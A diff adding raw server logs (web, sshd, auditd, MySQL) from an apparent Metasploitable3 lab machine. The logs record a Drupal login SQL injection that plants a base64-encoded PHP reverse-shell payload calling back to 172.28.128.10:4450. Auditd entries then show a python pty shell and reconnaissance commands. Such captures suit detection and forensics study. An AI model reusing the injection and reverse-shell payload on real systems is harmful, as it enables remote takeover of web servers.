@@ -1,0 +1,131 @@
+172.28.128.10 - - [10/Jul/2026:02:32:49 +0000] "GET /?probe=0 HTTP/1.1" 200 844 "-" "this_is_the_injection"
+type=SYSCALL msg=audit(1783650772.209:3394): arch=c000003e syscall=59 success=yes exit=0 a0=7f6c8546f050 a1=7f6c854782d0 a2=7f6c8546f090 a3=7f6c81d2ffe0 items=2 ppid=2279 pid=4663 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 ses=4294967295 tty=(none) comm="sshd" exe="/usr/sbin/sshd" key="exec_watch"
+type=EXECVE msg=audit(1783650772.209:3394): argc=3 a0="/usr/sbin/sshd" a1="-D" a2="-R"
+type=CWD msg=audit(1783650772.209:3394):  cwd="/"
+type=PATH msg=audit(1783650772.209:3394): item=0 name="/usr/sbin/sshd" inode=2108145 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1783650772.209:3394): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+Jul 10 02:32:58 metasploitable3-ub1404 sshd[4663]: Invalid user this_is_the_injection from 172.28.128.10
+Jul 10 02:32:58 metasploitable3-ub1404 sshd[4663]: input_userauth_request: invalid user this_is_the_injection [preauth]
+Jul 10 02:32:58 metasploitable3-ub1404 sshd[4663]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=172.28.128.10 
+type=USER_LOGIN msg=audit(1783650778.229:3395): pid=4663 uid=0 auid=4294967295 ses=4294967295 msg='op=login acct=28756E6B6E6F776E207573657229 exe="/usr/sbin/sshd" hostname=? addr=172.28.128.10 terminal=sshd res=failed'
+type=USER_LOGIN msg=audit(1783650778.229:3396): pid=4663 uid=0 auid=4294967295 ses=4294967295 msg='op=login acct=28696E76616C6964207573657229 exe="/usr/sbin/sshd" hostname=? addr=172.28.128.10 terminal=sshd res=failed'
+Jul 10 02:33:00 metasploitable3-ub1404 sshd[4663]: Failed password for invalid user this_is_the_injection from 172.28.128.10 port 55490 ssh2
+type=USER_AUTH msg=audit(1783650780.457:3397): pid=4663 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct="this_is_the_injection" exe="/usr/sbin/sshd" hostname=172.28.128.10 addr=172.28.128.10 terminal=ssh res=failed'
+type=USER_LOGIN msg=audit(1783650780.457:3398): pid=4663 uid=0 auid=4294967295 ses=4294967295 msg='op=login acct=28696E76616C6964207573657229 exe="/usr/sbin/sshd" hostname=? addr=172.28.128.10 terminal=sshd res=failed'
+260710  2:33:38	    8 Connect	root@localhost on drupal
+		    8 Query	SET NAMES utf8
+		    8 Query	SET sql_mode='ANSI,TRADITIONAL'
+		    8 Query	SELECT cid, data, created, expire, serialized FROM cache_bootstrap WHERE cid IN ('variables')
+		    8 Query	SELECT cid, data, created, expire, serialized FROM cache_bootstrap WHERE cid IN ('bootstrap_modules')
+		    8 Query	SELECT 1 FROM blocked_ips WHERE ip = '172.28.128.10'
+		    8 Query	SELECT cid, data, created, expire, serialized FROM cache_bootstrap WHERE cid IN ('lookup_cache')
+		    8 Query	SELECT cid, data, created, expire, serialized FROM cache_bootstrap WHERE cid IN ('system_list')
+		    8 Query	SELECT cid, data, created, expire, serialized FROM cache_bootstrap WHERE cid IN ('module_implements')
+		    8 Query	SELECT rid, permission FROM role_permission WHERE rid IN ('1')
+		    8 Query	SELECT cid, data, created, expire, serialized FROM cache_menu WHERE cid IN ('menu_item:30156020cdc11fee16cdb635f3a4a180c9df0ded10accd58ab025c6d92016c42')
+		    8 Query	SELECT cid, data, created, expire, serialized FROM cache_bootstrap WHERE cid IN ('hook_info')
+		    8 Query	INSERT INTO watchdog (uid, type, message, variables, severity, link, location, referer, hostname, timestamp) VALUES ('0', 'php', '%type: !message in %function (line %line of %file).', 'a:6:{s:5:\"%type\";s:7:\"Warning\";s:8:\"!message\";s:57:\"mb_strlen() expects parameter 1 to be string, array given\";s:9:\"%function\";s:15:\"drupal_strlen()\";s:5:\"%file\";s:41:\"/var/www/html/drupal/includes/unicode.inc\";s:5:\"%line\";i:441;s:14:\"severity_level\";i:4;}', '4', '', 'http://172.28.128.3/drupal/?q=user/login', '', '172.28.128.10', '1783650818')
+		    8 Query	INSERT INTO watchdog (uid, type, message, variables, severity, link, location, referer, hostname, timestamp) VALUES ('0', 'php', '%type: !message in %function (line %line of %file).', 'a:6:{s:5:\"%type\";s:7:\"Warning\";s:8:\"!message\";s:59:\"addcslashes() expects parameter 1 to be string, array given\";s:9:\"%function\";s:32:\"DatabaseConnection->escapeLike()\";s:5:\"%file\";s:51:\"/var/www/html/drupal/includes/database/database.inc\";s:5:\"%line\";i:965;s:14:\"severity_level\";i:4;}', '4', '', 'http://172.28.128.3/drupal/?q=user/login', '', '172.28.128.10', '1783650818')
+		    8 Query	SELECT users.name AS name
+FROM 
+users users
+WHERE  (name LIKE NULL ESCAPE '\\') AND (status = '0')
+		    8 Query	SELECT COUNT(*) FROM flood WHERE event = 'failed_login_attempt_ip' AND identifier = '172.28.128.10' AND timestamp > '1783647218'
+		    8 Query	SELECT * FROM users WHERE name = '';INSERT INTO cache_form (cid, data, expire, created, serialized) VALUES ('form_state_form-6eyC8K9mFNedOYPVjEK9jOtAMi0QC6nnMs1lZ9S0Poo', REPLACE(REPLACE('a:1:oPdjp0ODs:10:"build_info";a:1:oPdjp0ODs:5:"files";a:1:oPdjp0ODi:0;s:22:"modules/php/php.module";tgfcMfMztgfcMfMztgfcMfMz', 'oPdjp0OD', CHAR(123)), 'tgfcMfMz', CHAR(125)), -1, 0, 1);INSERT INTO cache_form (cid, data, expire, created, serialized) VALUES ('form_form-6eyC8K9mFNedOYPVjEK9jOtAMi0QC6nnMs1lZ9S0Poo', REPLACE(REPLACE('a:6:dASlafkQs:5:"#type";s:4:"form";s:8:"#parents";a:1:dASlafkQi:0;s:4:"user";MksxAtfss:8:"#process";a:1:dASlafkQi:0;s:13:"drupal_render";MksxAtfss:16:"#defaults_loaded";b:1;s:12:"#post_render";a:1:dASlafkQi:0;s:8:"php_eval";MksxAtfss:9:"#children";s:1726:"<?php eval(base64_decode(\'Y2FjaGVfY2xlYXJfYWxsKGFycmF5KCdmb3JtX2Zvcm0tNmV5QzhLOW1GTmVkT1lQVmpFSzlqT3RBTWkwUUM2bm5NczFsWjlTMFBvbycsICdmb3JtX3N0YXRlX2Zvcm0tNmV5QzhLOW1GTmVkT1lQVmpFSzlqT3RBTWkwUUM2bm5NczFsWjlTMFBvbycpLCAnY2FjaGVfZm9ybScpOy8qPD9waHAgLyoqLyBlcnJvcl9yZXBvcnRpbmcoMCk7ICRpcCA9ICcxNzIuMjguMTI4LjEwJzsgJHBvcnQgPSA0NDUwOyBpZiAoKCRmID0gJ3N0cmVhbV9zb2NrZXRfY2xpZW50JykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoInRjcDovL3skaXB9OnskcG9ydH0iKTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ2Zzb2Nrb3BlbicpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCRpcCwgJHBvcnQpOyAkc190eXBlID0gJ3N0cmVhbSc7IH0gaWYgKCEkcyAmJiAoJGYgPSAnc29ja2V0X2NyZWF0ZScpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKEFGX0lORVQsIFNPQ0tfU1RSRUFNLCBTT0xfVENQKTsgJHJlcyA9IEBzb2NrZXRfY29ubmVjdCgkcywgJGlwLCAkcG9ydCk7IGlmICghJHJlcykgeyBkaWUoKTsgfSAkc190eXBlID0gJ3NvY2tldCc7IH0gaWYgKCEkc190eXBlKSB7IGRpZSgnbm8gc29ja2V0IGZ1bmMnKTsgfSBpZiAoISRzKSB7IGRpZSgnbm8gc29ja2V0Jyk7IH0gc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRsZW4gPSBmcmVhZCgkcywgNCk7IGJyZWFrOyBjYXNlICdzb2NrZXQnOiAkbGVuID0gc29ja2V0X3JlYWQoJHMsIDQpOyBicmVhazsgfSBpZiAoISRsZW4pIHsgZGllKCk7IH0gJGEgPSB1bnBhY2soIk5sZW4iLCAkbGVuKTsgJGxlbiA9ICRhWydsZW4nXTsgJGIgPSAnJzsgd2hpbGUgKHN0cmxlbigkYikgPCAkbGVuKSB7IHN3aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiAkYiAuPSBmcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRiIC49IHNvY2tldF9yZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgfSB9ICRHTE9CQUxTWydtc2dzb2NrJ10gPSAkczsgJEdMT0JBTFNbJ21zZ3NvY2tfdHlwZSddID0gJHNfdHlwZTsgaWYgKGV4dGVuc2lvbl9sb2FkZWQoJ3N1aG9zaW4nKSAmJiBpbmlfZ2V0KCdzdWhvc2luLmV4ZWN1dG9yLmRpc2FibGVfZXZhbCcpKSB7ICRzdWhvc2luX2J5cGFzcz1jcmVhdGVfZnVuY3Rpb24oJycsICRiKTsgJHN1aG9zaW5fYnlwYXNzKCk7IH0gZWxzZSB7IGV2YWwoJGIpOyB9IGRpZSgpOw==\'));";MksxAtfs', 'dASlafkQ', CHAR(123)), 'MksxAtfs', CHAR(125)), -1, 0, 1);SELECT SLEEP(666);#, '' AND status = 1
+172.28.128.10 - - [10/Jul/2026:02:33:43 +0000] "POST /drupal/?q=user/login HTTP/1.1" 200 333 "-" "this_is_the_injection"
+260710  2:33:43	    9 Connect	root@localhost on drupal
+		    9 Query	SET NAMES utf8
+		    9 Query	SET sql_mode='ANSI,TRADITIONAL'
+		    9 Query	SELECT cid, data, created, expire, serialized FROM cache_bootstrap WHERE cid IN ('variables')
+		    9 Query	SELECT cid, data, created, expire, serialized FROM cache_bootstrap WHERE cid IN ('bootstrap_modules')
+		    9 Query	SELECT 1 FROM blocked_ips WHERE ip = '172.28.128.10'
+		    9 Query	SELECT cid, data, created, expire, serialized FROM cache_bootstrap WHERE cid IN ('lookup_cache')
+		    9 Query	SELECT cid, data, created, expire, serialized FROM cache_bootstrap WHERE cid IN ('system_list')
+		    9 Query	SELECT cid, data, created, expire, serialized FROM cache_bootstrap WHERE cid IN ('module_implements')
+		    9 Query	SELECT rid, permission FROM role_permission WHERE rid IN ('1')
+		    9 Query	SELECT cid, data, created, expire, serialized FROM cache_menu WHERE cid IN ('menu_item:30156020cdc11fee16cdb635f3a4a180c9df0ded10accd58ab025c6d92016c42')
+		    9 Query	SELECT cid, data, created, expire, serialized FROM cache_form WHERE cid IN ('form_form-6eyC8K9mFNedOYPVjEK9jOtAMi0QC6nnMs1lZ9S0Poo')
+		    9 Query	SELECT cid, data, created, expire, serialized FROM cache_form WHERE cid IN ('form_state_form-6eyC8K9mFNedOYPVjEK9jOtAMi0QC6nnMs1lZ9S0Poo')
+		    9 Query	DELETE FROM cache_form 
+WHERE  (cid IN  ('form_form-6eyC8K9mFNedOYPVjEK9jOtAMi0QC6nnMs1lZ9S0Poo', 'form_state_form-6eyC8K9mFNedOYPVjEK9jOtAMi0QC6nnMs1lZ9S0Poo'))
+type=SYSCALL msg=audit(1783650853.969:3430): arch=c000003e syscall=59 success=yes exit=0 a0=7f68cfd38a4e a1=7fffc63ff1c0 a2=7fffc6404328 a3=7f68d4456a50 items=2 ppid=3279 pid=4681 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=(none) comm="sh" exe="/bin/dash" key="exec_watch"
+type=EXECVE msg=audit(1783650853.969:3430): argc=3 a0="sh" a1="-c" a2=2F62696E2F736820
+type=CWD msg=audit(1783650853.969:3430):  cwd="/var/www/html/drupal"
+type=PATH msg=audit(1783650853.969:3430): item=0 name="/bin/sh" inode=262164 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1783650853.969:3430): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1783650853.973:3431): arch=c000003e syscall=59 success=yes exit=0 a0=7f1df5f8bab0 a1=7f1df5f8bad0 a2=7f1df5f8bae0 a3=7f1df5d5aa10 items=2 ppid=4681 pid=4682 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=(none) comm="sh" exe="/bin/dash" key="exec_watch"
+type=EXECVE msg=audit(1783650853.973:3431): argc=1 a0="/bin/sh"
+type=CWD msg=audit(1783650853.973:3431):  cwd="/var/www/html/drupal"
+type=PATH msg=audit(1783650853.973:3431): item=0 name="/bin/sh" inode=262164 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1783650853.973:3431): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1783650856.013:3432): arch=c000003e syscall=59 success=yes exit=0 a0=7faec9a42c38 a1=7faec9a42bc0 a2=7faec9a42be8 a3=7faec9811a10 items=2 ppid=4682 pid=4683 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=(none) comm="bash" exe="/bin/bash" key="exec_watch"
+type=EXECVE msg=audit(1783650856.013:3432): argc=4 a0="bash" a1="-c" a2=776869636820707974686F6E a3="this_is_the_injection"
+type=CWD msg=audit(1783650856.013:3432):  cwd="/var/www/html/drupal"
+type=PATH msg=audit(1783650856.013:3432): item=0 name="/bin/bash" inode=272808 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1783650856.013:3432): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1783650856.013:3433): arch=c000003e syscall=59 success=yes exit=0 a0=269db68 a1=269e808 a2=269dc08 a3=7fffb4afdfa0 items=3 ppid=4682 pid=4683 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=(none) comm="which" exe="/bin/dash" key="exec_watch"
+type=EXECVE msg=audit(1783650856.013:3433): argc=3 a0="/bin/sh" a1="/usr/bin/which" a2="python"
+type=CWD msg=audit(1783650856.013:3433):  cwd="/var/www/html/drupal"
+type=PATH msg=audit(1783650856.013:3433): item=0 name="/usr/bin/which" inode=262248 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1783650856.013:3433): item=1 name=(null) inode=262164 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1783650856.013:3433): item=2 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1783650858.113:3434): arch=c000003e syscall=59 success=yes exit=0 a0=7faec9a42c00 a1=7faec9a42b90 a2=7faec9a42bb0 a3=7faec9811a10 items=2 ppid=4682 pid=4684 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=(none) comm="python" exe="/usr/bin/python2.7" key="exec_watch"
+type=EXECVE msg=audit(1783650858.113:3434): argc=3 a0="python" a1="-c" a2=696D706F7274207074793B207074792E737061776E28222F62696E2F626173682229
+type=CWD msg=audit(1783650858.113:3434):  cwd="/var/www/html/drupal"
+type=PATH msg=audit(1783650858.113:3434): item=0 name="/usr/bin/python" inode=2105552 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1783650858.113:3434): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1783650858.165:3435): arch=c000003e syscall=59 success=yes exit=0 a0=271aab0 a1=27501d0 a2=7ffff5f86878 a3=7ffff5f858d0 items=2 ppid=4684 pid=4685 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=pts11 comm="bash" exe="/bin/bash" key="exec_watch"
+type=EXECVE msg=audit(1783650858.165:3435): argc=1 a0="/bin/bash"
+type=CWD msg=audit(1783650858.165:3435):  cwd="/var/www/html/drupal"
+type=PATH msg=audit(1783650858.165:3435): item=0 name="/bin/bash" inode=272808 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1783650858.165:3435): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1783650860.141:3437): arch=c000003e syscall=59 success=yes exit=0 a0=10b45e8 a1=10b5588 a2=10b2e08 a3=7fff7d8e03d0 items=2 ppid=4685 pid=4688 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=pts11 comm="bash" exe="/bin/bash" key="exec_watch"
+type=EXECVE msg=audit(1783650860.141:3437): argc=4 a0="bash" a1="-c" a2="id" a3="this_is_the_injection"
+type=CWD msg=audit(1783650860.141:3437):  cwd="/var/www/html/drupal"
+type=PATH msg=audit(1783650860.141:3437): item=0 name="/bin/bash" inode=272808 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1783650860.141:3437): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1783650860.145:3438): arch=c000003e syscall=59 success=yes exit=0 a0=2041fc8 a1=20416e8 a2=2042c08 a3=7fffe993d0a0 items=2 ppid=4685 pid=4688 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=pts11 comm="id" exe="/usr/bin/id" key="exec_watch"
+type=EXECVE msg=audit(1783650860.145:3438): argc=1 a0="id"
+type=CWD msg=audit(1783650860.145:3438):  cwd="/var/www/html/drupal"
+type=PATH msg=audit(1783650860.145:3438): item=0 name="/usr/bin/id" inode=2113128 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1783650860.145:3438): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1783650862.205:3439): arch=c000003e syscall=59 success=yes exit=0 a0=10b48e8 a1=10b4a08 a2=10b2e08 a3=7fff7d8e03d0 items=2 ppid=4685 pid=4689 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=pts11 comm="bash" exe="/bin/bash" key="exec_watch"
+type=EXECVE msg=audit(1783650862.205:3439): argc=4 a0="bash" a1="-c" a2=756E616D65202D61 a3="this_is_the_injection"
+type=CWD msg=audit(1783650862.205:3439):  cwd="/var/www/html/drupal"
+type=PATH msg=audit(1783650862.205:3439): item=0 name="/bin/bash" inode=272808 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1783650862.205:3439): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1783650862.209:3440): arch=c000003e syscall=59 success=yes exit=0 a0=1270b68 a1=1271808 a2=1270c08 a3=7fffa94aec10 items=2 ppid=4685 pid=4689 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=pts11 comm="uname" exe="/bin/uname" key="exec_watch"
+type=EXECVE msg=audit(1783650862.209:3440): argc=2 a0="uname" a1="-a"
+type=CWD msg=audit(1783650862.209:3440):  cwd="/var/www/html/drupal"
+type=PATH msg=audit(1783650862.209:3440): item=0 name="/bin/uname" inode=272830 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1783650862.209:3440): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1783650864.257:3441): arch=c000003e syscall=59 success=yes exit=0 a0=10b46e8 a1=10b4708 a2=10b2e08 a3=7fff7d8e03d0 items=2 ppid=4685 pid=4690 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=pts11 comm="bash" exe="/bin/bash" key="exec_watch"
+type=EXECVE msg=audit(1783650864.257:3441): argc=4 a0="bash" a1="-c" a2=697020616464722073686F77207C7C206966636F6E666967202D61 a3="this_is_the_injection"
+type=CWD msg=audit(1783650864.257:3441):  cwd="/var/www/html/drupal"
+type=PATH msg=audit(1783650864.257:3441): item=0 name="/bin/bash" inode=272808 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1783650864.257:3441): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1783650864.261:3442): arch=c000003e syscall=59 success=yes exit=0 a0=872648 a1=872c48 a2=871c08 a3=7fff886ef6c0 items=2 ppid=4690 pid=4691 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=pts11 comm="ip" exe="/bin/ip" key="exec_watch"
+type=EXECVE msg=audit(1783650864.261:3442): argc=3 a0="ip" a1="addr" a2="show"
+type=CWD msg=audit(1783650864.261:3442):  cwd="/var/www/html/drupal"
+type=PATH msg=audit(1783650864.261:3442): item=0 name="/sbin/ip" inode=262184 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1783650864.261:3442): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1783650866.349:3443): arch=c000003e syscall=59 success=yes exit=0 a0=10b4a28 a1=10b4f88 a2=10b2e08 a3=7fff7d8e03d0 items=2 ppid=4685 pid=4692 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=pts11 comm="bash" exe="/bin/bash" key="exec_watch"
+type=EXECVE msg=audit(1783650866.349:3443): argc=4 a0="bash" a1="-c" a2=697020726F7574652073686F77207C7C20726F757465202D6E a3="this_is_the_injection"
+type=CWD msg=audit(1783650866.349:3443):  cwd="/var/www/html/drupal"
+type=PATH msg=audit(1783650866.349:3443): item=0 name="/bin/bash" inode=272808 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1783650866.349:3443): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1783650866.353:3444): arch=c000003e syscall=59 success=yes exit=0 a0=149c648 a1=149cc48 a2=149bc08 a3=7fff97225be0 items=2 ppid=4692 pid=4693 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=pts11 comm="ip" exe="/bin/ip" key="exec_watch"
+type=EXECVE msg=audit(1783650866.353:3444): argc=3 a0="ip" a1="route" a2="show"
+type=CWD msg=audit(1783650866.353:3444):  cwd="/var/www/html/drupal"
+type=PATH msg=audit(1783650866.353:3444): item=0 name="/sbin/ip" inode=262184 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1783650866.353:3444): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1783650868.445:3445): arch=c000003e syscall=59 success=yes exit=0 a0=10b4b68 a1=10b8608 a2=10b2e08 a3=7fff7d8e03d0 items=2 ppid=4685 pid=4694 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=pts11 comm="bash" exe="/bin/bash" key="exec_watch"
+type=EXECVE msg=audit(1783650868.445:3445): argc=4 a0="bash" a1="-c" a2=617270202D61207C7C206970206E656967682073686F77 a3="this_is_the_injection"
+type=CWD msg=audit(1783650868.445:3445):  cwd="/var/www/html/drupal"
+type=PATH msg=audit(1783650868.445:3445): item=0 name="/bin/bash" inode=272808 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1783650868.445:3445): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1783650868.449:3446): arch=c000003e syscall=59 success=yes exit=0 a0=9b7568 a1=9b7c08 a2=9b6c08 a3=7ffff7545590 items=2 ppid=4694 pid=4695 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=pts11 comm="arp" exe="/usr/sbin/arp" key="exec_watch"
+type=EXECVE msg=audit(1783650868.449:3446): argc=2 a0="arp" a1="-a"
+type=CWD msg=audit(1783650868.449:3446):  cwd="/var/www/html/drupal"
+type=PATH msg=audit(1783650868.449:3446): item=0 name="/usr/sbin/arp" inode=2100062 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1783650868.449:3446): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
